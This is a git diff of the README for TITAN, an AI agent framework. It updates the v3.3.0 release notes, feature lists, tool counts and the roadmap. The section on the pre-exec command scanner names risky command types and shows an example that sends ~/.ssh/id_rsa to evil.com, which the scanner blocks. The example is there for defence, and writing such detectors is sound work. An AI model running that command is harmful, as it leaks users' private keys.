@@ -1,5 +1,5 @@
 [//]: # (npm-text-start)
-> **TITAN** — A TypeScript AI agent framework with autonomous self-improvement, LoRA fine-tuning, 242 tools, 36 LLM providers, 16 channels, mesh networking, LiveKit voice with F5-TTS cloning, Paperclip-style Command Post governance, mixture-of-agents reasoning, auto-skill generation, shadow git file recovery, and a React dashboard with 30+ panels. It trains itself. `npm i -g titan-agent`
+> **TITAN** — A TypeScript AI agent framework with empirical model adaptation, centralized output guardrails, autonomous self-improvement, LoRA fine-tuning, 242 tools, 36 LLM providers, 16 channels, mesh networking, LiveKit voice with F5-TTS cloning, Paperclip-style Command Post governance with wired approvals, mixture-of-agents reasoning, auto-skill generation, shadow git file recovery, and a React dashboard with 25+ panels. It trains itself and adapts to any model's quirks. `npm i -g titan-agent`
 [//]: # (npm-text-end)
 
 # TITAN — The Intelligent Task Automation Network
@@ -9,7 +9,7 @@
 </p>
 
 <p align="center">
-  <strong>An autonomous AI agent framework that actually does things — and gets better at it every day. Sub-agent orchestration, goal-driven autopilot, Paperclip-style Command Post governance, deliberative reasoning, mixture-of-agents reasoning, auto-skill generation from trajectories, shadow git file recovery, 5-phase context compression, centralized error taxonomy, credential rotation, per-turn model routing, sandbox code execution, browser automation with CAPTCHA solving, F5-TTS voice cloning, autonomous self-improvement, local model fine-tuning, 16 channels, 36 providers, 242 tools, 5,389 tests. It trains itself. Pure TypeScript. No native compilation. No, seriously.</strong>
+  <strong>An autonomous AI agent framework that actually does things — and gets better at it every day. Centralized output guardrails pipeline, empirical model capabilities probe, sub-agent orchestration, goal-driven autopilot, Paperclip-style Command Post governance with wired approvals, deliberative reasoning, mixture-of-agents reasoning, LLM-enhanced auto-skill generation, persistent audit with per-agent cost attribution, pre-exec command scanner, shadow git file recovery, 5-phase context compression, credential rotation, per-turn model routing, sandbox code execution, browser automation with CAPTCHA solving, F5-TTS voice cloning, autonomous self-improvement, local model fine-tuning, 16 channels, 36 providers, 242 tools, 5,399 tests. It trains itself and adapts to any model's quirks. Pure TypeScript. No native compilation. No, seriously.</strong>
 </p>
 
 <p align="center">
@@ -25,7 +25,7 @@
   <a href="#providers"><img src="https://img.shields.io/badge/providers-36-purple" alt="36 Providers"/></a>
   <a href="#built-in-tools"><img src="https://img.shields.io/badge/tools-242-orange" alt="242 Tools"/></a>
   <a href="#channels"><img src="https://img.shields.io/badge/channels-16-blue" alt="16 Channels"/></a>
-  <a href="#tests"><img src="https://img.shields.io/badge/tests-5%2C389-brightgreen" alt="5,389 Tests"/></a>
+  <a href="#tests"><img src="https://img.shields.io/badge/tests-5%2C399-brightgreen" alt="5,399 Tests"/></a>
   <a href="https://github.com/Djtony707/TITAN/graphs/contributors"><img src="https://img.shields.io/github/contributors/Djtony707/TITAN" alt="Contributors"/></a>
 </p>
 
@@ -76,7 +76,7 @@ TITAN is the only open-source agent framework that **trains itself on your GPU**
 | **GitHub Stars** | Growing | 348k | 48k | 28.4k | 56.7k | Emerging |
 | **Self-improving** | LoRA + auto-eval | Foundry/Trace | — | — | Limited | RL training (CISPO) |
 | **Local model fine-tuning** | LoRA on your GPU | — | — | — | — | Prefix tree merging (40× speedup) |
-| **Built-in GUI** | React SPA, 30+ panels | Web + mobile | Partial | — | AutoGen Studio | — |
+| **Built-in GUI** | React SPA, 25 panels | Web + mobile | Partial | — | AutoGen Studio | — |
 | **Agent governance** | Command Post (Paperclip) |
 | **Engineering personas** | 40 (19 from agent-skills) | — | — | — | — | — |
 | **Plan mode** | Interactive plan-then-execute | — | — | Human-in-the-loop | — | — |
@@ -101,27 +101,31 @@ TITAN is the only open-source agent framework that **trains itself on your GPU**
 
 ---
 
-> **What's New in v2.7.0 — Hermes-Inspired Intelligence Suite**
+> **What's New in v3.3.0 — Output Guardrails + Empirical Model Adaptation**
 >
-> **7 features adapted from NousResearch's Hermes agent framework**, re-engineered for TITAN's TypeScript architecture:
+> **The release that makes TITAN work correctly across every model.** Cloud LLMs (GLM-5.1, minimax, qwen, etc.) all behave differently — different thinking-field routing, different tool call formats, different quirks. v3.3.0 adds empirical discovery so TITAN adapts to each model automatically instead of us hand-coding quirks.
 >
-> **Centralized Error Taxonomy** — 14-category `FailoverReason` enum with 7-step classification pipeline. Every provider error gets structured recovery hints (retryable, shouldCompress, shouldRotateCredential, shouldFallback, cooldownMs). Smart circuit breaker — auth errors don't trigger provider lockout. Replaces scattered error handling across 4 files.
+> **Output Guardrails Pipeline** — Centralized 4-stage post-processing for every LLM response before it reaches users: **EXTRACT** (strip `<think>`, `<final>`, XML markers) → **CLEAN** (remove narrator preamble, instruction echoes, example labels) → **VALIDATE** (context-specific structural checks like hashtag presence for Facebook posts, no meta-language starts for chat) → **SCORE** (0-100 quality gate, reject below 50). Replaces 15+ ad-hoc leak-pattern regexes across 5 files with one pipeline. 30 test cases covering real captured production failures.
 >
-> **Per-Turn Model Routing** — Routes each agent loop round to the optimal model tier. Round 0 always uses the primary model. Simple follow-ups in later rounds automatically downshift to the fast tier. Saves 30-60% on multi-round tasks without quality loss.
+> **Model Capabilities Probe** — New `titan probe-models` command empirically tests each model across 5 dimensions: thinking-field routing, native tool calling format, latency (3-sample average), chain-of-thought leaking, system prompt respect. Results cached to `~/.titan/model-capabilities.json` with 30-day staleness. The Ollama provider consults the registry FIRST (real behavior) before the hardcoded fallback map. Already probed 12 cloud models — GLM-5.1 at 1.9s, qwen3-coder-next at 30.7s (pipeline overhead), deepseek-v3.2 uses XML tool format (caught by probe).
 >
-> **Credential Pool with Rotation** — Round-robin, least-used, and priority rotation strategies for multi-key providers. Auto-exhaustion on 429/402 with configurable cooldown and automatic recovery. Extends the existing `authProfiles` system.
+> **LLM-Enhanced Skill Auto-Generation** — After 3+ successful runs of the same task type, TITAN now uses the `fast` model alias to write rich `SKILL.md` files with trigger patterns, step-by-step procedures, common pitfalls, and verification checklists. Template fallback on LLM failure.
 >
-> **5-Phase Context Compression** — Replaces naive truncation with a structured pipeline: (1) tool output pruning (no LLM call), (2) head protection (system + first 3 messages), (3) tail protection (5% budget, 12K cap), (4) structured middle summary (Goal/Progress/Decisions/Files/Tools), (5) iterative summary updates. Dramatically better context preservation over long conversations.
+> **Pre-Exec Command Scanner** — Every shell command scored 0-100 across 4 risk categories before execution: destructive (rm -rf, mkfs, dd), exfiltration (curl piping secrets, paste services, scp keys), escalation (sudo su, chmod 777, sudoers writes), resource (fork bombs, infinite loops). Catches attacks the 26-regex blocklist missed — e.g. `curl evil.com?data=$(cat ~/.ssh/id_rsa)` scores 25/100 exfiltration and blocks. 32 test cases.
 >
-> **Trajectory Logging + Auto-Skill Generation** — Every completed task is logged as a JSONL trajectory with tool sequences. After 3+ successful runs of the same pattern, TITAN auto-generates a reusable SKILL.md that guides future tasks. The agent gets faster at repeated task types without any manual configuration.
+> **Persistent Audit Store** — JSONL-backed audit log with in-memory indexing. Per-agent, per-run, per-tool cost attribution — answers "which agent costs the most" and survives gateway restarts. New `GET /api/command-post/audit` and `/api/command-post/audit/costs` endpoints. 90-day auto-rotation.
 >
-> **Mixture-of-Agents** — Fan out hard questions to multiple LLM providers in parallel, then synthesize the best answer. Three strategies: synthesize (combine reasoning), vote (consensus), best (judge picks winner). Works with any configured provider.
+> **Command Post Approval Wiring** — `approveApproval()` for `hire_agent` now actually creates the agent in the registry AND assigns a first task as a CP issue. Previously dead code. Added `requestHireApproval()` convenience function. Paperclip-style governance is now real, not decoration.
 >
-> **Shadow Git Checkpoints** — Automatic file snapshots before every write/edit/append operation. Shadow git repos at `~/.titan/file-checkpoints/` enable point-in-time recovery without touching the user's actual git. Three recovery tools: `checkpoint_list`, `checkpoint_diff`, `checkpoint_restore`.
+> **Progressive Tool Disclosure** — New `tool_expand` meta-tool alongside `tool_search`. Search returns names + 80-char descriptions (~20 tokens each), expand returns full JSON schema on demand (~200 tokens). Saves ~10K tokens per compact-mode request.
 >
-> **Also new**: 142 skills (up from 117), 242 tools, 5,389 tests across 160 files.
+> **FB Autopilot Root-Cause Fix** — Captured a real bug: GLM-5.1 through Ollama routes ALL output to the `thinking` field when `think` param unset. TITAN's fallback was using the raw thinking field (containing internal planning like `[actual post text]`) as the post content. Fix: explicit `thinking: false` in `fb_autopilot.ts`. Verified clean posts now publishing autonomously.
 >
-> Previous: v2.0.0 — 15-layer tool pipeline, dreaming memory, OpenAI API compat, durable task flows, memory wiki.
+> **Also new**: Cross-turn loop detection (Finding #22/#46), mesh reconnect backoff cap tightened to 30s, SPA catch-all exempts `/mcp`, default user profile restored to README-promised path, modelAliases floor (merged on top of user overrides), `data_analysis` tool added to match README, AutoVerify forces retry on write failures, respond phase routes dropped tool calls back to act, FabricationGuard stopped overwriting correctly-written files.
+>
+> **Stats**: 137 loaded skills, 242 tools, 5,399 tests across 177 files. Every finding captured as a regression test in `tests/readme-hunt.test.ts` (35 tests).
+>
+> **Recent releases:** v3.2.4 — httpPool undici bundling fix, narrator preamble leak stripping. v3.2.3 — Synthetic User Hunt (9 production bugs fixed). v3.2.0 — MCP server HTTP mode, SmartCompress plugin. v3.1.0 — Smart auto-learning, task-type-aware compression. v3.0.0 — Autonomous Execution Engine (50-round sessions, 5-phase initiative workflow). v2.8.0 — Hermes-Inspired Intelligence Suite (error taxonomy, credential rotation, mixture-of-agents, shadow git).
 
 ---
 
@@ -208,7 +212,7 @@ TITAN SSHs into the target machine via the mesh network, pulls the latest code, 
 **"Get better at everything while I sleep"**
 TITAN runs self-improvement experiments overnight. It modifies its own prompts, evaluates the changes against a benchmark suite using LLM-as-judge scoring, and keeps only the improvements. It can even fine-tune its own local model on your GPU. You wake up to a smarter agent.
 
-No custom code required for any of the above. TITAN ships with 142 loaded skills exposing 242 tools. When it needs a capability it doesn't have, it can generate a new skill on the fly — or auto-generate one from successful task trajectories.
+No custom code required for any of the above. TITAN ships with 137 loaded skills exposing 242 tools. When it needs a capability it doesn't have, it can generate a new skill on the fly — or auto-generate one from successful task trajectories (after 3+ successful runs, LLM writes a rich `SKILL.md` automatically).
 
 ---
 
@@ -225,25 +229,25 @@ No custom code required for any of the above. TITAN ships with 142 loaded skills
             +-----------------+-----------------+
             |                 |                 |
       Multi-Agent        Channel           Security
-      Router (1-5)       Adapters (15)     Sandbox + Pairing
+      Router (1-5)       Adapters (16)     Sandbox + Pairing
             |            Discord            Shield + Vault
-      Agent Core         Telegram           Audit Log
+      Agent Core         Telegram           Audit Log (HMAC)
       Session Mgmt       Slack              Team RBAC
-      Reflection         WhatsApp
-      Sub-Agents         Teams              Browsing
-      Orchestrator       Google Chat        Browser Pool
-      Goals              Matrix             Stagehand
-      Initiative         Signal
-            |            WebChat             Mesh
-       +----+----+       IRC                mDNS + Tailscale
-       |         |       Mattermost         Peer Discovery
-    Skills    Providers  Lark/Feishu        WS Transport
-    142 loaded 36 total   Email (IMAP)
-    242 tools (4 native  LINE               Voice
-       |       + 30       Zulip             LiveKit WebRTC
-    Memory     compat)
-    Graph + RAG
-    Briefings
+      Reflection         WhatsApp           Output Guardrails
+      Sub-Agents         Teams              Command Scanner
+      Orchestrator       Google Chat
+      Goals              Matrix             Browsing
+      Initiative         Signal             Browser Pool
+            |            WebChat            Stagehand
+       +----+----+       IRC
+       |         |       Mattermost          Mesh
+    Skills    Providers  Lark/Feishu        mDNS + Tailscale
+    137 loaded 36 total   Email (IMAP)      Peer Discovery
+    242 tools (4 native  LINE               WS Transport
+       |       + 32       Zulip
+    Memory     compat)   FB Messenger        Voice
+    Graph + RAG                              LiveKit WebRTC
+    Briefings                                F5-TTS cloning
 ```
 
 Full architecture details: [ARCHITECTURE.md](ARCHITECTURE.md)
@@ -430,8 +434,8 @@ Or let autopilot handle it — set `autopilot.mode: "self-improve"` and TITAN ru
 | **Overview** | System health, uptime, memory usage, model info, cost stats |
 | **Agents** | Spawn, stop, and monitor up to 5 agent instances |
 | **Settings** | 6-tab live config: AI, Providers, Channels, Security, Gateway, Profile |
-| **Channels** | Connection status for all 15 channel adapters |
-| **Skills** | 142 loaded skills with per-skill enable/disable toggles |
+| **Channels** | Connection status for all 16 channel adapters |
+| **Skills** | 137 loaded skills with per-skill enable/disable toggles |
 | **Sessions** | Active sessions with message counts and history |
 | **Learning** | Tool success rates and knowledge base stats |
 | **Autopilot** | Schedule, status, history, and run control |
@@ -472,7 +476,7 @@ ollama serve  # Exposes models on the LAN
 
 ## Channels
 
-TITAN connects to 15 messaging platforms. All support the DM pairing security system.
+TITAN connects to 16 messaging platforms. All support the DM pairing security system.
 
 | Channel | Library | Notes |
 |---------|---------|-------|
@@ -488,9 +492,10 @@ TITAN connects to 15 messaging platforms. All support the DM pairing security sy
 | **IRC** | irc-framework | Any IRC network |
 | **Mattermost** | API client | Self-hosted team chat |
 | **Lark/Feishu** | API client | Enterprise messaging (ByteDance) |
-| **Email (IMAP)** | IMAP/SMTP | Inbound email monitoring |
+| **Email (IMAP)** | imapflow (optional dep) | Inbound email monitoring |
 | **LINE** | LINE Messaging API | Popular in Asia-Pacific |
 | **Zulip** | API client | Open-source team chat |
+| **Facebook Messenger** | Graph API | Page inbox + webhook + Autopilot posting |
 
 Configure via `~/.titan/titan.json` or the Mission Control Settings panel.
 
@@ -733,7 +738,7 @@ print(f"Found {len(results)} results")
 
 ## Built-in Tools
 
-142 loaded skills exposing 242 tools. All individually toggleable from Mission Control.
+137 loaded skills exposing 242 tools. All individually toggleable from Mission Control.
 
 | Category | Tools |
 |----------|-------|
@@ -767,16 +772,17 @@ print(f"Found {len(results)} results")
 | **NVIDIA GPU** | `nvidia_cuopt_solve`, `nvidia_cuopt_health`, `nvidia_aiq_research` (requires `TITAN_NVIDIA=1`) |
 | **VRAM Management** | `vram_status`, `vram_acquire`, `vram_release` (auto-swap models for GPU services) |
 
-### Tool Search — Compact Mode
+### Tool Search — Compact Mode + Progressive Disclosure
 
-TITAN doesn't dump all 242 tool schemas into every LLM call. It sends only 9 core tools plus `tool_search`. When the LLM needs a capability, it calls `tool_search("email")` and gets the relevant tools added dynamically.
+TITAN doesn't dump all 242 tool schemas into every LLM call. It sends only **20 core tools** plus two meta-tools: `tool_search` and `tool_expand` (new in v3.3.0). When the LLM needs a capability it doesn't have, it calls `tool_search("email")` to get matching tool names + one-line descriptions, then `tool_expand("email_send")` to get the full schema for just the tools it needs.
 
 ```
-Before: 242 tools x ~50 tokens each = ~10,450 input tokens
-After:  10 core tools + tool_search  = ~700 input tokens (93% reduction)
+Before: 242 tools × ~50 tokens each    = ~12,100 input tokens per call
+Compact mode: 20 core tools + search  = ~1,000 tokens per call (92% reduction)
++ Progressive: search returns metadata only  = saves another ~500 tokens
 ```
 
-Works with all 36 providers. Especially beneficial for cloud models and smaller local models where context window is precious.
+Works with all 36 providers. Especially beneficial for cloud models and smaller local models where context window is precious. Progressive disclosure (Hermes-inspired) means models see full schemas only for tools they actually plan to call.
 
 ---
 
@@ -932,12 +938,17 @@ The temporal graph is pure TypeScript — no Neo4j, no Docker, no external servi
 
 ```bash
 npm run build          # tsup ESM production build
-npm run test           # vitest (5,389 tests across 160 files)
+npm run build:ui       # Vite build for Mission Control React SPA
+npm run test           # vitest (5,399 tests across 177 files)
 npm run test:coverage  # ~82% line coverage
 npm run ci             # typecheck + full test suite
 npm run typecheck      # tsc --noEmit
 npm run lint           # ESLint
 npm run dev:gateway    # Dev mode with tsx hot-reload
+
+# New in v3.3.0
+titan probe-models --all-cloud   # Empirically probe all cloud models
+titan probe-models --list         # Show cached capabilities registry
 ```
 
 See [CONTRIBUTING.md](CONTRIBUTING.md) for the full development guide and [ARCHITECTURE.md](ARCHITECTURE.md) for the codebase layout.
@@ -946,16 +957,30 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for the full development guide and [ARCHI
 
 ## Roadmap
 
-### Current (v3.0.0) — April 12, 2026
+### Current (v3.3.0) — April 16, 2026
 
-- **v3.0.0**: **Autonomous Execution Engine** — Complete rewrite of the autonomous pipeline. 50-round sessions in autonomous mode (was 4-10). Read-only round detection forces models to act after diagnosing. Playwright browser verification (verify_page tool). Background shell process support. AutoPush forces tool calls when models describe instead of acting. 5-phase initiative workflow (plan → execute → verify → fix → confirm). Build-retry loop (3 attempts within same session). Persistent task state between sessions. Memory staleness verification. Comprehensive security audit (7 fixes). Prompt caching for Anthropic provider. 60+ features verified working. 4,792 tests across 160 files.
+- **v3.3.0**: **Output Guardrails + Empirical Model Adaptation** — Centralized 4-stage output post-processing pipeline (EXTRACT → CLEAN → VALIDATE → SCORE) replacing scattered ad-hoc sanitization across 5+ files. Empirical model capabilities probe tests each model across 5 dimensions (thinking routing, tool calling format, latency, CoT leaking, system prompt respect) and caches results to `~/.titan/model-capabilities.json`. LLM-enhanced skill auto-generation. Pre-exec command scanner (4 risk categories, 0-100 scoring). Persistent audit store with per-agent cost attribution. Command Post approval wiring (hire_agent actually creates agents now). Progressive tool disclosure via new `tool_expand` meta-tool. FB autopilot root-cause fix (GLM-5.1 thinking-field routing). 9 critical findings closed (#22, #39-#47). 137 skills, 242 tools, 5,399 tests across 177 files.
 
-### Previous (v2.8.x)
+### Previous (v3.2.x)
 
-- **v2.8.0**: **Hermes-Inspired Intelligence Suite** — 7 features adapted from NousResearch's Hermes agent framework. Centralized error taxonomy (14 categories, 7-step classification, structured recovery hints). Per-turn model routing (fast tier for simple follow-ups, 30-60% cost savings). Credential pool with round-robin/least-used rotation and auto-exhaustion. 5-phase context compression (tool pruning, head/tail protection, structured summary, iterative updates). Task-level trajectory logging with auto-skill generation from repeated patterns. Mixture-of-agents tool (parallel multi-model queries with synthesize/vote/best strategies). Shadow git file checkpoints with automatic pre-write snapshots and point-in-time recovery. 142 skills, 242 tools, 5,389 tests across 160 files.
+- **v3.2.4** (April 15, 2026): Finding #38 fix for httpPool undici bundling, narrator preamble leak stripping. Version 3.2.3 republished with all required files.
+- **v3.2.3** (April 14, 2026): Synthetic User Hunt — 9 real production bugs fixed. Tool hallucination, system prompt leak, chain-of-thought leak, session ID pollution, autonomous mode forceToolUse, context trim tool pair orphans.
+- **v3.2.1** (April 13, 2026): SmartExit completion detection, pair-aware context trim.
+- **v3.2.0** (April 13, 2026): MCP server HTTP mode, SmartCompress plugin.
 
-### Previous (v2.0.0)
+### Previous (v3.1.x)
 
+- **v3.1.2** (April 12, 2026): Onboarding wizard fixes, voice stream cleanup.
+- **v3.1.1** (April 12, 2026): Hindsight MCP bridge for cross-session episodic memory.
+- **v3.1.0** (April 12, 2026): Smart auto-learning — SmartCompress plugin (task-type-aware compression), continuous learning feedback loop, ordered tool sequence capture.
+
+### Previous (v3.0.0) — April 12, 2026
+
+- **v3.0.0**: **Autonomous Execution Engine** — Complete rewrite of the autonomous pipeline. 50-round sessions in autonomous mode (was 4-10). Read-only round detection forces models to act after diagnosing. Playwright browser verification (verify_page tool). Background shell process support. AutoPush forces tool calls when models describe instead of acting. 5-phase initiative workflow (plan → execute → verify → fix → confirm). Build-retry loop (3 attempts within same session). Persistent task state between sessions. Memory staleness verification. Comprehensive security audit (7 fixes). Prompt caching for Anthropic provider. 60+ features verified working.
+
+### Previous (v2.x)
+
+- **v2.8.0**: **Hermes-Inspired Intelligence Suite** — 7 features adapted from NousResearch's Hermes agent framework. Centralized error taxonomy (14 categories, 7-step classification, structured recovery hints). Per-turn model routing. Credential pool with round-robin/least-used rotation. 5-phase context compression. Task-level trajectory logging with auto-skill generation. Mixture-of-agents tool. Shadow git file checkpoints.
 - **v2.0.0** (April 8, 2026): **Model-Agnostic Tool Pipeline + Dreaming Memory + OpenAI Compat** — 15-layer tool calling pipeline, 3-phase Dreaming memory, OpenAI API compatibility, durable task flows, Memory Wiki, agent template marketplace, RL trajectory capture, video generation (Runway), 28 dashboard panels, 220+ tools.
 
 ### Previous (v1.x)
